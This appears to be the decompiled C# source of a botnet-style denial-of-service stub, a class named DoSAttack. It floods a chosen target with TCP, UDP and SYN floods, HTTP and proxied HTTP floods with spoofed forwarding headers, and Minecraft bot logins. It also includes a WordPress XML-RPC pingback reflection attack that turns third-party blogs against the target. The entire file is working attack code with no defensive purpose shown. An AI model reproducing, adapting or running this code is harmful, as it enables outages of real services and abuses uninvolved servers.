using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Stub
{
	public class DoSAttack
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public void print(string text)
		{
			log = DateTime.Now.ToString("(HH:mm:ss) ") + text + "\r\n" + log;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002088 File Offset: 0x00000288
		public string randomIp(Random rand)
		{
			return string.Concat(new string[]
			{
				rand.Next(1, 254).ToString(),
				".",
				rand.Next(1, 254).ToString(),
				".",
				rand.Next(1, 254).ToString(),
				".",
				rand.Next(1, 254).ToString()
			});
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002124 File Offset: 0x00000324
		public string randomIpList()
		{
			string text = "";
			Random random = new Random();
			int num = random.Next(1, 5);
			for (int i = 0; i < num; i++)
			{
				if (i + 1 < num)
				{
					text = text + randomIp(random) + ", ";
				}
				else
				{
					text += randomIp(random);
				}
			}
			return text;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002194 File Offset: 0x00000394
		private string readFile(string path)
		{
			string text = "";
			StreamReader streamReader = new StreamReader(path);
			string arg;
			while ((arg = streamReader.ReadLine()) != null)
			{
				text = text + arg + '\n';
			}
			streamReader.Close();
			return text;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021E4 File Offset: 0x000003E4
		public bool isUrl(string url)
		{
			bool flag = false;
			int num = 0;
			while (num < url.Length && !flag)
			{
				flag = ((url[num] >= 'a' && url[num] <= 'z') || (url[num] >= 'A' && url[num] <= '>'));
				num++;
			}
			return flag;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002250 File Offset: 0x00000450
		private string randomString(int size)
		{
			Random random = new Random();
			string text = "";
			for (int i = 0; i < size; i++)
			{
				int value = random.Next(0, 24);
				char c = Convert.ToChar(value);
				text += c;
			}
			return text;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000022A8 File Offset: 0x000004A8
		private string randomString2(int minlen, int maxlen)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			Random random = new Random();
			char[] array = new char[random.Next(minlen) + (maxlen - minlen)];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = text[random.Next(text.Length)];
			}
			return new string(array);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002310 File Offset: 0x00000510
		public void sendMCLogin(NetworkStream prdstream, string username, string ownIp)
		{
			prdstream.WriteByte(15);
			prdstream.WriteByte(0);
			prdstream.WriteByte(5);
			prdstream.WriteByte(Convert.ToByte(ownIp.Length));
			byte[] bytes = Encoding.ASCII.GetBytes(ownIp);
			prdstream.Write(bytes, 0, bytes.Length);
			prdstream.WriteByte(13);
			prdstream.WriteByte(129);
			prdstream.WriteByte(2);
			prdstream.WriteByte(Convert.ToByte(2 + username.Length));
			prdstream.WriteByte(0);
			prdstream.WriteByte(Convert.ToByte(username.Length));
			bytes = Encoding.ASCII.GetBytes(username);
			prdstream.Write(bytes, 0, bytes.Length);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000023C4 File Offset: 0x000005C4
		public void sendMCMessage(NetworkStream prdstream, string message)
		{
			prdstream.WriteByte(Convert.ToByte(message.Length + 2));
			prdstream.WriteByte(1);
			prdstream.WriteByte(Convert.ToByte(message.Length));
			byte[] bytes = Encoding.ASCII.GetBytes(message);
			prdstream.Write(bytes, 0, bytes.Length);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002418 File Offset: 0x00000618
		public void useless()
		{
			string text = PressData;
			string text2 = PressBody;
			int num = threadId++;
			string text3;
			if (num < blogList.Length)
			{
				text3 = blogList[num];
			}
			else
			{
				Random random = new Random();
				text3 = blogList[random.Next(0, blogList.Length - 1)];
			}
			string hostname;
			string newValue;
			string text4;
			if (text3.Contains(" "))
			{
				string[] array = text3.Split(new char[]
				{
					' '
				});
				hostname = array[0].Replace("http://", "").Split(new char[]
				{
					'/'
				})[0];
				newValue = array[1].Replace("http://", "").Split(new char[]
				{
					'/'
				})[0];
				text3 = array[1];
				text4 = text3.Replace("//", "@");
				text4 = text4.Split(new char[]
				{
					'/'
				})[0];
				text4 = text4.Replace("@", "//");
			}
			else
			{
				newValue = text3.Replace("http://", "").Split(new char[]
				{
					'/'
				})[0];
				hostname = resolveUrl(text3);
				text4 = text3.Split(new string[]
				{
					"?p="
				}, StringSplitOptions.None)[0];
			}
			text2 = text2.Replace("//TARGET//", completeUrl).Replace("//BLOG//", text3);
			text = text.Replace("//BLOG//", newValue).Replace("//LENGTH//", text2.Length.ToString()).Replace("//BODY//", text2).Replace("//BLOGH//", text4);
			while (isAttacking && method == "PRESS")
			{
				TcpClient tcpClient = new TcpClient();
				try
				{
					try
					{
						tcpClient.Connect(hostname, 80);
						currentAttack++;
						online++;
					}
					catch
					{
						offline++;
					}
					NetworkStream stream = tcpClient.GetStream();
					byte[] bytes = Encoding.ASCII.GetBytes(text);
					stream.Write(bytes, 0, bytes.Length);
				}
				catch
				{
				}
				Thread.Sleep(10);
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000026D8 File Offset: 0x000008D8
		public string resolveUrl(string url)
		{
			string result = url;
			if (!url.Contains("http://") && !url.Contains("https://"))
			{
				url = "http://" + url;
			}
			try
			{
				result = Dns.GetHostEntry(new Uri(url).Host).AddressList[0].ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002754 File Offset: 0x00000954
		private void attackThread()
		{
			while (!threadsLoaded)
			{
				Thread.Sleep(100);
			}
			for (; ; )
			{
				Thread.Sleep(100);
				while (!isAttacking)
				{
					Thread.Sleep(50);
				}
				if (first)
				{
					first = false;
				}
				string text = method;
				switch (text)
				{
					case "TCP":
						while (isAttacking && method == "TCP")
						{
							if (isUrl(ip))
							{
								ip = resolveUrl(ip);
							}
							TcpClient tcpClient = new TcpClient();
							try
							{
								try
								{
									tcpClient.Connect(ip, port);
									currentAttack++;
									online++;
								}
								catch
								{
									offline++;
								}
								NetworkStream stream = tcpClient.GetStream();
								byte[] bytes = Encoding.ASCII.GetBytes(tcpStuff);
								for (int i = 0; i <= 1; i++)
								{
									stream.Write(bytes, 0, bytes.Length);
								}
							}
							catch
							{
							}
						}
						break;
					case "HTTP":
						{
							Random random = new Random();
							string value = userAgents[random.Next(0, userAgents.Length - 1)];
							while (isAttacking && method == "HTTP")
							{
								try
								{
									WebClient webClient = new WebClient();
									webClient.Headers["User-Agent"] = value;
									webClient.Headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
									webClient.Headers["Accept-Language"] = "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3";
									webClient.Headers["Accept-Encoding"] = "gzip, deflate";
									Stream stream2 = webClient.OpenRead(ip);
								}
								catch
								{
								}
							}
							break;
						}
					case "SYN":
						{
							IPEndPoint remoteEP;
							try
							{
								IPAddress[] addressList = Dns.GetHostEntry(ip).AddressList;
								remoteEP = new IPEndPoint(addressList[0], port);
							}
							catch
							{
								remoteEP = new IPEndPoint(IPAddress.Parse(ip), port);
							}
							while (isAttacking && method == "SYN")
							{
								try
								{
									Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
									socket.BeginConnect(remoteEP, new AsyncCallback(onSynConnect), socket);
									Thread.Sleep(200);
									socket.Close();
								}
								catch
								{
								}
							}
							break;
						}
					case "UDP":
						{
							UdpClient udpClient = new UdpClient();
							while (isAttacking && method == "UDP")
							{
								try
								{
									udpClient = new UdpClient();
									try
									{
										udpClient.Connect(ip, port);
										currentAttack++;
									}
									catch
									{
									}
									byte[] bytes2 = Encoding.ASCII.GetBytes(udpStuff);
									for (int j = 0; j <= 1; j++)
									{
										udpClient.Send(bytes2, bytes2.Length);
									}
								}
								catch
								{
								}
								udpClient.Close();
							}
							break;
						}
					case "PRESS":
						{
							string text2 = PressData;
							string text3 = PressBody;
							int num = threadId++;
							int num2 = num;
							string text4;
							if (num2 < blogList.Length)
							{
								text4 = blogList[num2];
							}
							else
							{
								Random random2 = new Random();
								text4 = blogList[random2.Next(0, blogList.Length - 1)];
							}
							string hostname;
							string newValue;
							string text5;
							if (text4.Contains(" "))
							{
								string[] array = text4.Split(new char[]
								{
							' '
								});
								hostname = array[0].Replace("http://", "").Split(new char[]
								{
							'/'
								})[0];
								newValue = array[1].Replace("http://", "").Split(new char[]
								{
							'/'
								})[0];
								text4 = array[1];
								text5 = text4.Replace("//", "@");
								text5 = text5.Split(new char[]
								{
							'/'
								})[0];
								text5 = text5.Replace("@", "//");
							}
							else
							{
								newValue = text4.Replace("http://", "").Split(new char[]
								{
							'/'
								})[0];
								hostname = resolveUrl(text4);
								text5 = text4.Split(new string[]
								{
							"?p="
								}, StringSplitOptions.None)[0];
							}
							text3 = text3.Replace("//TARGET//", completeUrl).Replace("//BLOG//", text4);
							string text6 = text2.Replace("//BLOG//", newValue);
							string oldValue = "//LENGTH//";
							num = text3.Length;
							text2 = text6.Replace(oldValue, num.ToString()).Replace("//BODY//", text3).Replace("//BLOGH//", text5);
							while (isAttacking && method == "PRESS")
							{
								TcpClient tcpClient2 = new TcpClient();
								try
								{
									try
									{
										tcpClient2.Connect(hostname, 80);
										currentAttack++;
										online++;
									}
									catch
									{
										offline++;
									}
									NetworkStream stream3 = tcpClient2.GetStream();
									byte[] bytes = Encoding.ASCII.GetBytes(text2);
									stream3.Write(bytes, 0, bytes.Length);
								}
								catch
								{
								}
								Thread.Sleep(10);
							}
							break;
						}
					case "HTTPROXY":
						try
						{
							completeUrl = ip;
							string text7 = ProxyData;
							int num = threadId++;
							int num3 = num;
							string newValue2 = "";
							Random random2 = new Random();
							string text8;
							if (num3 < proxyList.Length)
							{
								text8 = proxyList[num3];
							}
							else
							{
								random2 = new Random();
								text8 = proxyList[random2.Next(0, proxyList.Length - 1)];
								newValue2 = userAgents[random2.Next(0, userAgents.Length - 1)];
							}
							string newValue3 = randomIpList();
							string hostname2 = text8.Split(new char[]
							{
							':'
							})[0];
							int num4 = Convert.ToInt32(text8.Split(new char[]
							{
							':'
							})[1]);
							text7 = text7.Replace("//URL//", completeUrl.Replace("http://", "").Replace("https://", "").Split(new char[]
							{
							'/'
							})[0]).Replace("//CURL//", completeUrl).Replace("//USERAGENT//", newValue2).Replace("//IPLIST//", newValue3);
							while (isAttacking && method == "HTTPROXY" && completeUrl == ip)
							{
								TcpClient tcpClient2 = new TcpClient();
								try
								{
									try
									{
										tcpClient2.Connect(hostname2, num4);
										currentAttack++;
										online++;
									}
									catch
									{
										offline++;
									}
									NetworkStream stream3 = tcpClient2.GetStream();
									byte[] bytes = Encoding.ASCII.GetBytes(text7);
									stream3.Write(bytes, 0, bytes.Length);
								}
								catch
								{
								}
								Thread.Sleep(2);
							}
						}
						catch
						{
						}
						break;
					case "MCBOTALPHA":
						try
						{
							while (isAttacking && method == "MCBOTALPHA")
							{
								TcpClient tcpClient2 = new TcpClient();
								try
								{
									try
									{
										tcpClient2.Connect(ip, port);
										currentAttack++;
										online++;
									}
									catch
									{
										offline++;
									}
									NetworkStream stream3 = tcpClient2.GetStream();
									string username = randomString2(6, 12);
									sendMCLogin(stream3, username, "127.0.0.2");
									Thread.Sleep(300);
									sendMCMessage(stream3, "/register register register");
									Thread.Sleep(1000);
									sendMCMessage(stream3, "/factions");
									Thread.Sleep(1000);
									sendMCMessage(stream3, randomString2(6, 50));
								}
								catch
								{
								}
								Thread.Sleep(2);
							}
						}
						catch
						{
						}
						break;
				}
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000032D8 File Offset: 0x000014D8
		private void onSynConnect(IAsyncResult ar)
		{
			currentAttack++;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00003318 File Offset: 0x00001518
		public void attack(string newIp, int newPort, string newMethod = "TCP", int threads = 1000)
		{
			if (!isAttacking)
			{
				Thread thread = new Thread(delegate ()
				{
					prv_attack(newIp, newPort, newMethod, threads);
				});
				thread.Start();
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00003380 File Offset: 0x00001580
		private void prv_attack(string newIp, int newPort, string newMethod = "TCP", int threads = 1000)
		{
			if (!isAttacking)
			{
				currentAttack = 0;
				online = 1;
				offline = 1;
				completeUrl = newIp;
				try
				{
					method = newMethod;
					if (isUrl(newIp) && (method == "UDP" || method == "TCP" || method == "MCBOTALPHA"))
					{
						ip = resolveUrl(newIp);
					}
					else
					{
						ip = newIp;
					}
					port = newPort;
					numberOfThreads = threads;
					isAttacking = true;
					if (!threadsLoaded || numberOfThreads != startedThreads)
					{
						if (!threadsLoaded)
						{
							udpStuff = randomString(4096);
							tcpStuff = randomString(65564);
						}
						initThreads();
						startThreads();
					}
				}
				catch (Exception arg)
				{
					errorsLog += arg;
					numberOfErrors++;
					GC.Collect();
					GC.WaitForPendingFinalizers();
				}
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000034DC File Offset: 0x000016DC
		public void stop()
		{
			if (isAttacking)
			{
				isAttacking = false;
				ip = "";
				port = 0;
				numberOfThreads = 0;
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x0000351C File Offset: 0x0000171C
		private void startThreads()
		{
			threadsLoaded = false;
			for (int i = startedThreads; i < numberOfThreads; i++)
			{
				try
				{
					threadList[i].Start();
				}
				catch
				{
				}
				startedThreads++;
			}
			threadsLoaded = true;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00003590 File Offset: 0x00001790
		private void initThreads()
		{
			removeThreads();
			for (int i = startedThreads; i < numberOfThreads; i++)
			{
				trd = new Thread(new ThreadStart(attackThread), 262144);
				trd.IsBackground = true;
				threadList.Add(trd);
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000035FC File Offset: 0x000017FC
		private void stopThreads()
		{
			for (int i = 0; i < numberOfThreads; i++)
			{
				threadList[i].Abort();
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00003633 File Offset: 0x00001833
		private void removeThreads()
		{
			threadList.Clear();
		}

		// Token: 0x04000001 RID: 1
		public string[] userAgents = new string[]
		{
			"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
			"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
			"Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
			"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
			"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
			"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
			"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
			"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
			"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
			"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
			"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
			"HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
			"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
			"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
		};

		// Token: 0x04000002 RID: 2
		private List<Thread> threadList = new List<Thread>();

		// Token: 0x04000003 RID: 3
		public string HTTPData = "GET / HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive  ";

		// Token: 0x04000004 RID: 4
		public string PressBody = "<?xmlversion=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>//TARGET//</string></value></param><param><value><string>//BLOG//</string></value></param></params></methodCall>";

		// Token: 0x04000005 RID: 5
		public string PressData = "POST //BLOGH///xmlrpc.php HTTP/1.0\r\nHost: //BLOG//\r\nUser-Agent: Internal Wordpress RPC connection\r\nContent-Type: text/xml\r\nContent-Length: //LENGTH//\r\n\r\n//BODY//";

		// Token: 0x04000006 RID: 6
		public string ProxyData = "GET //CURL// HTTP/1.1\r\nHost: //URL//\r\nUser-Agent: //USERAGENT//\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\r\nX-Forwarded-For: //IPLIST//\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n";

		// Token: 0x04000007 RID: 7
		public bool isAttacking;

		// Token: 0x04000008 RID: 8
		public string method;

		// Token: 0x04000009 RID: 9
		public string completeUrl;

		// Token: 0x0400000A RID: 10
		public bool threadsLoaded = false;

		// Token: 0x0400000B RID: 11
		public string udpStuff;

		// Token: 0x0400000C RID: 12
		public int threadId = 0;

		// Token: 0x0400000D RID: 13
		public string tcpStuff;

		// Token: 0x0400000E RID: 14
		public int currentAttack = 0;

		// Token: 0x0400000F RID: 15
		public int startedThreads = 0;

		// Token: 0x04000010 RID: 16
		public int numberOfErrors;

		// Token: 0x04000011 RID: 17
		public string ip;

		// Token: 0x04000012 RID: 18
		public bool first = true;

		// Token: 0x04000013 RID: 19
		public string log = "";

		// Token: 0x04000014 RID: 20
		public int offline = 1;

		// Token: 0x04000015 RID: 21
		public string[] blogList;

		// Token: 0x04000016 RID: 22
		public string[] proxyList;

		// Token: 0x04000017 RID: 23
		public int online = 1;

		// Token: 0x04000018 RID: 24
		public string errorsLog;

		// Token: 0x04000019 RID: 25
		public int port;

		// Token: 0x0400001A RID: 26
		public int numberOfThreads = 0;

		// Token: 0x0400001B RID: 27
		public Thread trd;
	}
}